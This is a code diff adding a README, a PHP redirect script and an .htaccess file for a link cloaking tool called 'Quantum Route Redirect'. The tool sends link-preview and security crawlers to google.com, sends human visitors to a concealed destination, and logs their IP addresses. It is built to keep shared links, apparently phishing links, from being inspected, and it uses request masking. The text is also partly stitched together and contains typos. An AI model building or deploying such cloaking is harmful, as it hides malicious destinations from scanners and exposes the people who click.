@@ -1,0 +1,576 @@
+# Quantum Route Redirect
+
+This is **Advanced Rivate Redirect** - an advanced PHP-based visitor classification and intelligent redirection system with **ANTI-CRAWLING PROTECTION** and **BUILT-IN REDIRECT GENERATOR**. The system automatically classifies website visitors as "bot" or "human" using both local detection and an external API service. **CRITICAL SECURITY FEATURE: Prevents social media bots (Telegram, WhatsApp, Facebook, etc.) from discovering the final destination URLs through preview crawling.**
+
+## PRODUCTION ARCHITECTURE (Updated Aug 6, 2025)
+- **Admin Panel at Root (/)**: Complete management interface accessible at domain root
+- **Redirect Generator (/advanced)**: Shareable link that performs the actual visitor classification and redirection
+- **Custom Shortcode Support**: Optional shortcode generation for branded/memorable redirect URLs
+- **Tabbed Analytics**: Organized visitor lists with All/Human/Bot separation with empty state for fresh launches
+- **Enhanced Auto-refresh**: 5-second polling for near real-time updates
+- **First Launch Ready**: Clean state with no visitor data and default configuration
+
+# User Preferences
+
+Preferred communication style: Simple, everyday language.
+
+# System Architecture
+
+## Frontend Architecture
+- **Enhanced HTML Admin Panel**: A comprehensive admin interface (`admin.html`) with visitor logs and system configuration
+- **Modern CSS Styling**: Responsive design with blue color scheme, hover effects, and mobile-friendly layout
+- **Interactive JavaScript**: Dynamic configuration management, real-time API testing, and auto-refresh functionality
+
+## Backend Architecture
+- **PHP-based Classification Engine**: Main entry point (`index.php`) handles visitor detection, classification, and redirection
+- **Dual Classification Strategy**: 
+  - Local pre-screening using User-Agent analysis
+  - External API validation via Advanced Redirect Private Server API
+- **File-based Configuration**: Uses `redirect_url.txt` for dynamic URL configuration
+
+## Data Flow
+1. **Visitor Request**: User lands on `index.php`
+2. **Data Extraction**: System captures IP address and User-Agent string
+3. **Local Pre-screening**: Browser and device type detection from User-Agent
+4. **API Classification**: External validation for likely human visitors
+5. **Redirection Decision**: Route to appropriate URL based on classification
+6. **Logging**: Human visitors logged to `admin.html` file
+
+# Key Components
+
+## Visitor Detection Module
+- **ANTI-CRAWLING PROTECTION**: Immediate blocking of social media crawlers (Telegram, Facebook, Twitter, WhatsApp, LinkedIn, Slack, Discord) before destination discovery
+- **IP Address Extraction**: Multi-header fallback system for accurate IP detection  
+- **User-Agent Analysis**: Local parsing for browser type (Chrome, Firefox, Safari, Edge, IE) and device type (Desktop/Mobile)
+- **Bot Pre-screening**: Immediate bot classification for "Unknown" browser/device combinations
+- **HTTP Security Headers**: Prevents indexing, caching, and preview generation
+
+## External API Integration
+- **Advanced Redirect Serviver**: Third-party classification service
+- **Endpoint**: `https://davidnmarx.com/api/classify`
+- **Authentication**: API key-based authentication via `X-API-Key` header
+- **Request Masking**: Browser-like headers to appear as legitimate traffic
+
+## Admin Panel Features
+- **Password Protection**: Secure login system with changeable admin password (default: admin123)
+- **Session Management**: PHP session-based authentication with login/logout functionality
+- **Visitor Logging**: HTML-based storage with ALL visitor data (both humans and bots) appended directly to `admin.html`
+- **Enhanced Statistics Dashboard**: 
+  - Total visitor count
+  - Today's visitor count  
+  - Separate counts for Human vs Bot visitors
+  - Real-time visitor classification statistics
+  - Shortcode tracking in visitor location data
+- **Configuration Management**: Dynamic URL and API key configuration through web interface
+- **API Status Monitoring**: Manual API connection testing (no automatic quota waste)
+- **Password Management**: Ability to change admin password after login
+- **Smart Auto-refresh**: Automatic data refresh every 5 seconds for near real-time monitoring
+
+## Configuration Management
+- **Dynamic URL Configuration**: `redirect_url.txt` and `bot_url.txt` files for redirect URLs
+- **User-managed API Keys**: Users must obtain and configure their own API keys via admin panel
+- **Web-based Configuration**: Admin panel interface for real-time configuration updates
+- **Secure Storage**: API keys stored in `api_key.txt` file for persistence
+- **Fallback System**: Hardcoded defaults ensure system reliability when API unavailable
+
+# Data Flow
+
+```
+Visitor Request → IP/User-Agent Extraction → Local Bot Detection → 
+API Classification (if needed) → Redirection Decision → 
+Logging (ALL visitors: humans AND bots) → URL Redirect
+```
+
+# External Dependencies
+
+## Third-party Services
+- **Advanced Redirect Server**: External classification service requiring API key authentication
+- **https://example.com**: Default redirect destination for human visitors
+
+## PHP Requirements
+- **cURL Extension**: Required for external API communication
+- **File System Access**: Needed for reading configuration and writing logs
+
+# Deployment Strategy
+
+## File Structure
+- **Admin Panel**: `index.html` serves as the admin interface at domain root
+- **Redirect Engine**: `advanced.php` serves as the main visitor classification entry point
+- **Static Assets**: HTML admin panel and configuration files
+- **No Database Required**: File-based storage eliminates database dependencies
+
+## Configuration Requirements
+- **API Key**: Must be configured in PHP script for Advanced Redirect API access
+- **File Permissions**: Write access required for `admin.html` logging
+- **Web Server**: Standard PHP-enabled web server (Apache, Nginx, etc.)
+
+## Security Considerations
+- **API Key Protection**: Sensitive credentials embedded in source code
+- **Input Validation**: User-Agent and IP address handling
+- **File-based Logging**: Direct HTML file manipulation for visitor data
+
+
+Advanced visitor classification and intelligent redirection system with anti-crawling protection and real-time analytics.
+
+## Features
+
+- **Anti-Crawling Protection**: Prevents social media bots from discovering final destination URLs
+- **Real-time Visitor Analytics**: Live tracking with 5-second refresh intervals
+- **Custom Shortcode Support**: Create branded redirect URLs with custom identifiers
+- **Dual Classification**: Local pre-screening + external API validation
+- **Tabbed Dashboard**: Organized visitor lists (All/Human/Bot)
+- **Secure Admin Panel**: Password-protected management interface
+
+## Quick Start
+
+1. Access admin panel at your domain root
+2. Login with password: `admin123` (change immediately)
+3. Configure destination URLs for humans and bots
+4. Copy generated redirect link from admin panel
+5. Share your link - visitor data appears automatically
+
+## Files
+
+- `index.html` - Admin panel interface
+- `advanced.php` - Visitor classification engine
+- `admin_auth.php` - Authentication handler
+- `get_config.php` - Configuration API
+- `update_config.php` - Configuration update handler
+- Configuration files: `api_key.txt`, `redirect_url.txt`, `bot_url.txt`
+- Security files: `.htaccess`, `robots.txt`
+
+## Security
+
+- Password-protected admin access
+- Session-based authentication
+- Anti-crawling meta tags and headers
+- Immediate bot redirection prevents URL discovery
+- Input validation and sanitization
+
+<?php
+REDIRECT.PHP
+/**
+ * PHP Visitor Classification & Redirection System - Redirect Generator
+ * ANTI-CRAWLING PROTECTION: Prevents bots from discovering destination URLs
+ * Automatically classifies visitors as bot or human using external API
+ * and redirects them to appropriate URLs while logging human visitors
+ */
+
+// SECURITY: Prevent any preview generation or crawling
+header('X-Robots-Tag: noindex, nofollow, nosnippet, noarchive, noimageindex');
+header('Cache-Control: no-cache, no-store, must-revalidate');
+header('Pragma: no-cache');
+header('Expires: 0');
+
+// Configuration with absolute paths for Apache compatibility
+$API_ENDPOINT = 'https://b5c9b90c-2b1a-4515-8f6e-08614985a083-00-1nd7hrl46szbn.worf.replit.dev/api/classify';
+$DEFAULT_BOT_URL = 'https://google.com';
+$DEFAULT_HUMAN_URL = 'https://example.com';
+$ADMIN_LOG_FILE = __DIR__ . '/index.html';
+$REDIRECT_URL_FILE = __DIR__ . '/redirect_url.txt';
+$BOT_URL_FILE = __DIR__ . '/bot_url.txt';
+$API_KEY_FILE = __DIR__ . '/api_key.txt';
+$MAX_RETRIES = 3;
+
+// Get API key from file only (users must set it via admin panel)
+$API_KEY = null;
+if (file_exists($API_KEY_FILE)) {
+    $API_KEY = trim(file_get_contents($API_KEY_FILE));
+}
+
+/**
+ * Extract visitor's real IP address using multiple fallback methods
+ */
+function getVisitorIP() {
+    $headers = [
+        'HTTP_CF_CONNECTING_IP',     // Cloudflare
+        'HTTP_X_FORWARDED_FOR',      // Load balancer/proxy
+        'HTTP_X_FORWARDED',          // Proxy
+        'HTTP_X_CLUSTER_CLIENT_IP',  // Cluster
+        'HTTP_CLIENT_IP',            // Proxy
+        'HTTP_FORWARDED_FOR',        // Proxy
+        'HTTP_FORWARDED',            // Proxy
+        'REMOTE_ADDR'                // Direct connection
+    ];
+    
+    foreach ($headers as $header) {
+        if (!empty($_SERVER[$header])) {
+            $ips = explode(',', $_SERVER[$header]);
+            $ip = trim($ips[0]);
+            
+            // Validate IP address
+            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+                return $ip;
+            }
+        }
+    }
+    
+    // Fallback to REMOTE_ADDR even if private
+    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+}
+
+/**
+ * Get visitor's User-Agent string
+ */
+function getVisitorUserAgent() {
+    return $_SERVER['HTTP_USER_AGENT'] ?? '';
+}
+
+/**
+ * Local bot detection using User-Agent analysis
+ * Returns array with browser type, device type, and isBot flag
+ */
+function analyzeUserAgent($userAgent) {
+    $userAgent = strtolower($userAgent);
+    
+    // Browser detection
+    $browser = 'Unknown';
+    if (strpos($userAgent, 'chrome') !== false && strpos($userAgent, 'edg') === false) {
+        $browser = 'Chrome';
+    } elseif (strpos($userAgent, 'firefox') !== false) {
+        $browser = 'Firefox';
+    } elseif (strpos($userAgent, 'safari') !== false && strpos($userAgent, 'chrome') === false) {
+        $browser = 'Safari';
+    } elseif (strpos($userAgent, 'edg') !== false) {
+        $browser = 'Edge';
+    } elseif (strpos($userAgent, 'trident') !== false || strpos($userAgent, 'msie') !== false) {
+        $browser = 'Internet Explorer';
+    }
+    
+    // Device type detection
+    $device = 'Unknown';
+    if (strpos($userAgent, 'mobile') !== false || strpos($userAgent, 'android') !== false || 
+        strpos($userAgent, 'iphone') !== false || strpos($userAgent, 'ipad') !== false) {
+        $device = 'Mobile';
+    } elseif (strpos($userAgent, 'windows') !== false || strpos($userAgent, 'macintosh') !== false || 
+             strpos($userAgent, 'linux') !== false) {
+        $device = 'Desktop';
+    }
+    
+    // Bot detection logic - if browser or device is unknown, likely a bot
+    $isBot = ($browser === 'Unknown' || $device === 'Unknown');
+    
+    return [
+        'browser' => $browser,
+        'device' => $device,
+        'isBot' => $isBot
+    ];
+}
+
+/**
+ * Classify visitor using external API with retry logic
+ */
+function classifyVisitorAPI($ip, $userAgent) {
+    global $API_ENDPOINT, $API_KEY, $MAX_RETRIES;
+    
+    if (empty($API_KEY)) {
+        return null;
+    }
+    
+    $data = json_encode([
+        'ip' => $ip,
+        'user_agent' => $userAgent
+    ]);
+    
+    for ($attempt = 1; $attempt <= $MAX_RETRIES; $attempt++) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $API_ENDPOINT,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $data,
+            CURLOPT_HTTPHEADER => [
+                'Content-Type: application/json',
+                'X-API-Key: ' . $API_KEY,
+                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept: application/json',
+                'Cache-Control: no-cache'
+            ],
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_CONNECTTIMEOUT => 5,
+            CURLOPT_SSL_VERIFYPEER => true,
+            CURLOPT_FOLLOWLOCATION => false,
+            CURLOPT_MAXREDIRS => 0,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ]);
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+        
+        if ($error) {
+            error_log("cURL error on attempt $attempt: $error");
+            if ($attempt === $MAX_RETRIES) {
+                return null; // API failed, treat as bot
+            }
+            sleep(pow(2, $attempt - 1)); // Exponential backoff
+            continue;
+        }
+        
+        if ($httpCode === 403) {
+            error_log("API returned 403 Forbidden (attempt $attempt)");
+            if ($attempt === $MAX_RETRIES) {
+                return null; // API failed, treat as bot
+            }
+            sleep(pow(2, $attempt - 1)); // Exponential backoff
+            continue;
+        }
+        
+        if ($httpCode === 200) {
+            $data = json_decode($response, true);
+            if ($data && isset($data['visitor_type'])) {
+                return $data;
+            }
+        }
+        
+        error_log("API request failed with HTTP code: $httpCode (attempt $attempt)");
+        if ($attempt === $MAX_RETRIES) {
+            return null; // API failed, treat as bot
+        }
+        sleep(pow(2, $attempt - 1)); // Exponential backoff
+    }
+    
+    return null;
+}
+
+/**
+ * Get human redirect URL from configuration file
+ */
+function getHumanRedirectURL() {
+    global $REDIRECT_URL_FILE, $DEFAULT_HUMAN_URL;
+    
+    if (file_exists($REDIRECT_URL_FILE)) {
+        $url = trim(file_get_contents($REDIRECT_URL_FILE));
+        if (!empty($url)) {
+            return $url;
+        }
+    }
+    
+    return $DEFAULT_HUMAN_URL;
+}
+
+/**
+ * Get bot redirect URL from configuration file
+ */
+function getBotRedirectURL() {
+    global $BOT_URL_FILE, $DEFAULT_BOT_URL;
+    
+    if (file_exists($BOT_URL_FILE)) {
+        $url = trim(file_get_contents($BOT_URL_FILE));
+        if (!empty($url)) {
+            return $url;
+        }
+    }
+    
+    return $DEFAULT_BOT_URL;
+}
+
+/**
+ * Log visitor to admin.html file
+ * Appends visitor data to the table in admin.html
+ */
+function logVisitor($ip, $userAgent, $analysis, $apiData, $visitorType = 'human') {
+    global $ADMIN_LOG_FILE;
+    
+    $timestamp = date('Y-m-d H:i:s');
+    $location = isset($apiData['location']) ? $apiData['location'] : 'Unknown';
+    $isp = isset($apiData['isp']) ? $apiData['isp'] : 'Unknown';
+    
+    // Read current admin.html content
+    if (!file_exists($ADMIN_LOG_FILE)) {
+        return; // Admin panel doesn't exist yet
+    }
+    
+    $content = file_get_contents($ADMIN_LOG_FILE);
+    
+    // Find the tbody section and extract existing rows
+    if (preg_match('/<tbody id="allVisitorData">(.*?)<\/tbody>/s', $content, $matches)) {
+        $existingRows = $matches[1];
+        
+        // Parse existing rows and remove any with same IP
+        $rows = [];
+        if (!empty($existingRows)) {
+            preg_match_all('/<tr>(.*?)<\/tr>/s', $existingRows, $rowMatches);
+            foreach ($rowMatches[1] as $rowContent) {
+                preg_match_all('/<td>(.*?)<\/td>/', $rowContent, $cellMatches);
+                if (count($cellMatches[1]) >= 3) {
+                    $rowIp = trim($cellMatches[1][2]); // IP is in 3rd column
+                    if ($rowIp !== $ip) {
+                        $rows[] = $cellMatches[1];
+                    }
+                }
+            }
+        }
+        
+        // Add shortcode to location if available for tracking
+        $locationWithShortcode = $location;
+        if (!empty($GLOBALS['current_shortcode'])) {
+            $locationWithShortcode .= " (via: " . htmlspecialchars($GLOBALS['current_shortcode']) . ")";
+        }
+        
+        // Add new row with visitor type
+        $newRow = [
+            '', // S/N placeholder
+            htmlspecialchars($timestamp),
+            htmlspecialchars($ip),
+            htmlspecialchars($locationWithShortcode),
+            htmlspecialchars($isp),
+            htmlspecialchars($analysis['browser']),
+            htmlspecialchars($analysis['device']),
+            htmlspecialchars(ucfirst($visitorType))
+        ];
+        $rows[] = $newRow;
+        
+        // Generate new table body with sequential S/N
+        $newTableBody = '';
+        foreach ($rows as $index => $row) {
+            $sn = $index + 1;
+            $row[0] = $sn; // Set S/N
+            $newTableBody .= '<tr>';
+            foreach ($row as $cell) {
+                $newTableBody .= '<td>' . $cell . '</td>';
+            }
+            $newTableBody .= '</tr>' . "\n";
+        }
+        
+        // Replace table body in content
+        $content = preg_replace(
+            '/(<tbody id="allVisitorData">).*?(<\/tbody>)/s',
+            '$1' . "\n" . $newTableBody . '$2',
+            $content
+        );
+        
+        // Write updated content
+        file_put_contents($ADMIN_LOG_FILE, $content);
+    }
+}
+
+/**
+ * Redirect visitor to specified URL
+ */
+function redirectVisitor($url) {
+    header("Location: $url", true, 302);
+    exit;
+}
+
+// Main execution starts here
+try {
+    // Check for shortcode parameter (optional custom identifier)
+    $shortcode = isset($_GET['c']) ? trim($_GET['c']) : null;
+    
+    // Store shortcode globally for logging
+    $GLOBALS['current_shortcode'] = null;
+    if ($shortcode && preg_match('/^[a-zA-Z0-9-]+$/', $shortcode)) {
+        $GLOBALS['current_shortcode'] = $shortcode;
+        error_log("Shortcode accessed: $shortcode");
+    }
+    
+    // Extract visitor information
+    $visitorIP = getVisitorIP();
+    $visitorUserAgent = getVisitorUserAgent();
+    
+    // SECURITY: Block all crawlers and preview bots IMMEDIATELY
+    $userAgentLower = strtolower($visitorUserAgent);
+    $crawlerPatterns = [
+        'telegrambot', 'twitterbot', 'facebookexternalhit', 'whatsapp', 'linkedinbot',
+        'slackbot', 'discordbot', 'googlebot', 'bingbot', 'crawl', 'spider',
+        'preview', 'scraper', 'bot', 'fetch', 'parser', 'extractor'
+    ];
+    
+    foreach ($crawlerPatterns as $pattern) {
+        if (strpos($userAgentLower, $pattern) !== false) {
+            // IMMEDIATE REDIRECT - No destination discovery
+            $botURL = getBotRedirectURL();
+            header("Location: $botURL", true, 302);
+            exit();
+        }
+    }
+    
+    // Local bot detection (pre-screening)
+    $analysis = analyzeUserAgent($visitorUserAgent);
+    
+    // If local analysis suggests bot, log and redirect
+    if ($analysis['isBot']) {
+        // Log bot visitor
+        logVisitor($visitorIP, $visitorUserAgent, $analysis, null, 'bot');
+        $botURL = getBotRedirectURL();
+        redirectVisitor($botURL);
+    }
+    
+    // API-based classification for likely humans
+    $apiResult = null;
+    $isBot = true; // Default to bot if no API key or API fails
+    
+    if (!empty($API_KEY)) {
+        $apiResult = classifyVisitorAPI($visitorIP, $visitorUserAgent);
+        if ($apiResult && isset($apiResult['visitor_type'])) {
+            $isBot = (strtolower($apiResult['visitor_type']) === 'bot');
+        }
+    }
+    
+    if ($isBot) {
+        // Log and redirect bot
+        logVisitor($visitorIP, $visitorUserAgent, $analysis, $apiResult, 'bot');
+        $botURL = getBotRedirectURL();
+        redirectVisitor($botURL);
+    } else {
+        // Log human visitor
+        logVisitor($visitorIP, $visitorUserAgent, $analysis, $apiResult, 'human');
+        
+        // Redirect human
+        $humanURL = getHumanRedirectURL();
+        redirectVisitor($humanURL);
+    }
+    
+} catch (Exception $e) {
+    error_log("Visitor classification error: " . $e->getMessage());
+    // On error, redirect to bot URL as safety measure
+    $botURL = getBotRedirectURL();
+    redirectVisitor($botURL);
+}
+?>
+.htacess
+# ANTI-CRAWLING PROTECTION FOR APACHE
+# Block all social media crawlers and preview bots
+
+# Block Telegram bot
+RewriteCond %{HTTP_USER_AGENT} TelegramBot [NC]
+RewriteRule .* https://google.com [R=302,L]
+
+# Block Facebook crawler
+RewriteCond %{HTTP_USER_AGENT} facebookexternalhit [NC]
+RewriteRule .* https://google.com [R=302,L]
+
+# Block Twitter bot
+RewriteCond %{HTTP_USER_AGENT} Twitterbot [NC]
+RewriteRule .* https://google.com [R=302,L]
+
+# Block WhatsApp crawler
+RewriteCond %{HTTP_USER_AGENT} WhatsApp [NC]
+RewriteRule .* https://google.com [R=302,L]
+
+# Block LinkedIn bot
+RewriteCond %{HTTP_USER_AGENT} LinkedInBot [NC]
+RewriteRule .* https://google.com [R=302,L]
+
+# Block Slack bot
+RewriteCond %{HTTP_USER_AGENT} Slackbot [NC]
+RewriteRule .* https://google.com [R=302,L]
+
+# Block Discord bot
+RewriteCond %{HTTP_USER_AGENT} DiscordBot [NC]
+RewriteRule .* https://google.com [R=302,L]
+
+# Block generic crawlers
+RewriteCond %{HTTP_USER_AGENT} (bot|crawl|spider|scraper|preview|fetch|parser|extractor) [NC]
+RewriteRule .* https://google.com [R=302,L]
+
+# Security headers
+Header always set X-Robots-Tag "noindex, nofollow, nosnippet, noarchive, noimageindex"
+Header always set Cache-Control "no-cache, no-store, must-revalidate"
+Header always set Pragma "no-cache"
+Header always set Expires "0"
+
+
+The system prioritizes simplicity and effectiveness, using a hybrid approach of local detection and external API validation to accurately classify visitors while maintaining fast response times through pre-screening mechanisms.
